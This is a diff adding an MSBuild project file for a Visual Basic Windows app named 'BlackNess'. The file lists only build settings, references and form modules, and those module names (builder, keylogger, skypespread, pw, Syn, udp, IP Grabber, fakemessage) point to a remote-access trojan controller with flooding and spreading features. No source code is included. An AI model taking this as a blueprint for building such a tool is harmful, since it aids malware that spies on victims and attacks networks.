@@ -1,0 +1,630 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>
+    </ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{4003BA6D-2B31-47E1-9523-8B164BA1A8E3}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>Evil1._0a.My.MyApplication</StartupObject>
+    <RootNamespace>Evil1._0a</RootNamespace>
+    <AssemblyName>BlackNess</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+    <TargetFrameworkProfile>
+    </TargetFrameworkProfile>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>BlackNess.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>..\..\..\..\</OutputPath>
+    <DocumentationFile>BlackNess.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>Off</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>injection.ico</ApplicationIcon>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="DevComponents.DotNetBar2">
+      <HintPath>..\..\..\..\..\..\..\Program Files\DotNetBar\Bin\DevComponents.DotNetBar2.dll</HintPath>
+    </Reference>
+    <Reference Include="Microsoft.VisualC" />
+    <Reference Include="skincrafter.net-vs2005">
+      <HintPath>..\..\..\..\..\..\..\Program Files\SkinCrafter3\SkinCrafterDemo\SkinCrafterDotNet_vs2005\skincrafter.net-vs2005.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Configuration" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Design" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.Windows.Forms" />
+    <Import Include="System.Linq" />
+    <Import Include="System.Xml.Linq" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="about.Designer.vb">
+      <DependentUpon>about.vb</DependentUpon>
+    </Compile>
+    <Compile Include="about.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="background.Designer.vb">
+      <DependentUpon>background.vb</DependentUpon>
+    </Compile>
+    <Compile Include="background.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="blockwebsite.Designer.vb">
+      <DependentUpon>blockwebsite.vb</DependentUpon>
+    </Compile>
+    <Compile Include="blockwebsite.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="builder.Designer.vb">
+      <DependentUpon>builder.vb</DependentUpon>
+    </Compile>
+    <Compile Include="builder.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="changehomepage.Designer.vb">
+      <DependentUpon>changehomepage.vb</DependentUpon>
+    </Compile>
+    <Compile Include="changehomepage.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="cinfo.Designer.vb">
+      <DependentUpon>cinfo.vb</DependentUpon>
+    </Compile>
+    <Compile Include="cinfo.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="closeprocess.Designer.vb">
+      <DependentUpon>closeprocess.vb</DependentUpon>
+    </Compile>
+    <Compile Include="closeprocess.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="connection.vb" />
+    <Compile Include="dl.Designer.vb">
+      <DependentUpon>dl.vb</DependentUpon>
+    </Compile>
+    <Compile Include="dl.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="fakemessage.Designer.vb">
+      <DependentUpon>fakemessage.vb</DependentUpon>
+    </Compile>
+    <Compile Include="fakemessage.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.vb">
+      <DependentUpon>Form1.vb</DependentUpon>
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="gport.Designer.vb">
+      <DependentUpon>gport.vb</DependentUpon>
+    </Compile>
+    <Compile Include="gport.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Html.Designer.vb">
+      <DependentUpon>Html.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Html.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="httpf.Designer.vb">
+      <DependentUpon>httpf.vb</DependentUpon>
+    </Compile>
+    <Compile Include="httpf.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="icon.vb" />
+    <Compile Include="IP Grabber.Designer.vb">
+      <DependentUpon>IP Grabber.vb</DependentUpon>
+    </Compile>
+    <Compile Include="IP Grabber.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="IP Tracer.Designer.vb">
+      <DependentUpon>IP Tracer.vb</DependentUpon>
+    </Compile>
+    <Compile Include="IP Tracer.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ipport.Designer.vb">
+      <DependentUpon>ipport.vb</DependentUpon>
+    </Compile>
+    <Compile Include="ipport.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="keylogger.Designer.vb">
+      <DependentUpon>keylogger.vb</DependentUpon>
+    </Compile>
+    <Compile Include="keylogger.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="msn.Designer.vb">
+      <DependentUpon>msn.vb</DependentUpon>
+    </Compile>
+    <Compile Include="msn.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="noip.Designer.vb">
+      <DependentUpon>noip.vb</DependentUpon>
+    </Compile>
+    <Compile Include="noip.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="notif.Designer.vb">
+      <DependentUpon>notif.vb</DependentUpon>
+    </Compile>
+    <Compile Include="notif.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="openprog.Designer.vb">
+      <DependentUpon>openprog.vb</DependentUpon>
+    </Compile>
+    <Compile Include="openprog.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="openurl.Designer.vb">
+      <DependentUpon>openurl.vb</DependentUpon>
+    </Compile>
+    <Compile Include="openurl.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="pw.Designer.vb">
+      <DependentUpon>pw.vb</DependentUpon>
+    </Compile>
+    <Compile Include="pw.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="settings.Designer.vb">
+      <DependentUpon>settings.vb</DependentUpon>
+    </Compile>
+    <Compile Include="settings.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="skypespread.Designer.vb">
+      <DependentUpon>skypespread.vb</DependentUpon>
+    </Compile>
+    <Compile Include="skypespread.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Speak.Designer.vb">
+      <DependentUpon>Speak.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Speak.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="startprocess.Designer.vb">
+      <DependentUpon>startprocess.vb</DependentUpon>
+    </Compile>
+    <Compile Include="startprocess.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Syn.Designer.vb">
+      <DependentUpon>Syn.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Syn.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="udp.Designer.vb">
+      <DependentUpon>udp.vb</DependentUpon>
+    </Compile>
+    <Compile Include="udp.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="vbs.Designer.vb">
+      <DependentUpon>vbs.vb</DependentUpon>
+    </Compile>
+    <Compile Include="vbs.vb">
+      <SubType>Form</SubType>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="about.resx">
+      <DependentUpon>about.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="background.resx">
+      <DependentUpon>background.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="blockwebsite.resx">
+      <DependentUpon>blockwebsite.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="builder.resx">
+      <DependentUpon>builder.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="changehomepage.resx">
+      <DependentUpon>changehomepage.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="cinfo.resx">
+      <DependentUpon>cinfo.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="closeprocess.resx">
+      <DependentUpon>closeprocess.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="dl.resx">
+      <DependentUpon>dl.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="fakemessage.resx">
+      <DependentUpon>fakemessage.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.vb</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="gport.resx">
+      <DependentUpon>gport.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Html.resx">
+      <DependentUpon>Html.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="httpf.resx">
+      <DependentUpon>httpf.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="IP Grabber.resx">
+      <DependentUpon>IP Grabber.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="IP Tracer.resx">
+      <DependentUpon>IP Tracer.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ipport.resx">
+      <DependentUpon>ipport.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="keylogger.resx">
+      <DependentUpon>keylogger.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="msn.resx">
+      <DependentUpon>msn.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="noip.resx">
+      <DependentUpon>noip.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="notif.resx">
+      <DependentUpon>notif.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="openprog.resx">
+      <DependentUpon>openprog.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="openurl.resx">
+      <DependentUpon>openurl.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="pw.resx">
+      <DependentUpon>pw.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="settings.resx">
+      <DependentUpon>settings.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="skypespread.resx">
+      <DependentUpon>skypespread.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Speak.resx">
+      <DependentUpon>Speak.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="startprocess.resx">
+      <DependentUpon>startprocess.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Syn.resx">
+      <DependentUpon>Syn.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="udp.resx">
+      <DependentUpon>udp.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="vbs.resx">
+      <DependentUpon>vbs.vb</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\map-magnify-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\computer-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\computer-icon1.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\computer-go-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\computer-delete-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\computer-error-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Sign-Info-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\BSOD.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\firewall-burn-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cmd.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\system-monitor-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\application-view-list-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\mouse-select-right-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tick.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\tick1.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Delete-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\lightning.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\emotion_suprised.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\emotion_wink.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\bug.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\usb-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\drive.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\drive_cd.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\drive_cd_empty.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\drive_error.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Misc-Database-3-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\emotion_tongue.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\keyboard_magnify.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\key_a.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\key_z.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\key_e.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\key_t.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Apps-Skype-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cog.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cog_delete.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\cog_add.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\document_inspector.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\IE-SZ-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include=".NETFramework,Version=v4.0,Profile=Client">
+      <Visible>False</Visible>
+      <ProductName>Microsoft .NET Framework 4 Client Profile %28x86 et x64%29</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Windows.Installer.3.1">
+      <Visible>False</Visible>
+      <ProductName>Windows Installer 3.1</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\world_link.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Apps-Skype-icon1.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Misc-Settings-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Button-Turn-Off-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\make-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\socket-plus-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\socket-minus-icon.png" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="Resources\Location-HTTP-icon.png" />
+    <None Include="Resources\arrow-switch-090-icon.png" />
+    <None Include="Resources\My-Computer-icon.png" />
+    <None Include="Resources\icon.ico" />
+    <None Include="Resources\System-Windows-icon.png" />
+    <None Include="Resources\key-icon.png" />
+    <None Include="Resources\key-icon1.png" />
+    <None Include="Resources\lock-icon.png" />
+    <None Include="Resources\cog-icon.png" />
+    <None Include="Resources\cogs-icon.png" />
+    <None Include="Resources\fps.png" />
+    <None Include="Resources\Viseur.png" />
+    <None Include="Resources\application-delete-icon.png" />
+    <None Include="Resources\application-add-icon.png" />
+    <None Include="Resources\eye-icon.png" />
+    <None Include="Resources\chart-bar-icon.png" />
+    <None Include="Resources\document-import-icon.png" />
+    <None Include="Resources\html.png" />
+    <None Include="Resources\batch.png" />
+    <None Include="Resources\batch1.png" />
+    <None Include="Resources\bin-closed-icon.png" />
+    <None Include="Resources\database-go-icon.png" />
+    <None Include="Resources\database-connect-icon.png" />
+    <None Include="Resources\database-add-icon.png" />
+    <None Include="Resources\database-delete-icon.png" />
+    <None Include="Resources\database-error-icon.png" />
+    <None Include="Resources\database-delete-icon1.png" />
+    <None Include="Resources\database-lightning-icon.png" />
+    <Content Include="injection.ico" />
+    <None Include="Resources\icon-security-icon.png" />
+    <None Include="Resources\steam-icon.png" />
+    <None Include="Resources\floppy-icon.png" />
+    <None Include="Resources\database-save-icon.png" />
+    <None Include="Resources\database-delete-icon2.png" />
+    <None Include="Resources\database-gear-icon.png" />
+    <None Include="Resources\cursor-icon.png" />
+    <None Include="Resources\ip-icon.png" />
+    <None Include="Resources\MSN-icon.png" />
+    <None Include="Resources\clan-bomber-icon.png" />
+    <None Include="Resources\fire-icon.png" />
+    <None Include="Resources\Actions-system-lock-screen-icon.png" />
+    <Content Include="Resources\television.png" />
+    <Content Include="Resources\television_add.png" />
+    <Content Include="Resources\television_delete.png" />
+    <None Include="Resources\vbs.png" />
+    <None Include="Resources\transmit-icon.png" />
+    <None Include="Resources\Users-Folder-icon.png" />
+    <Content Include="Web-Browser.ico" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
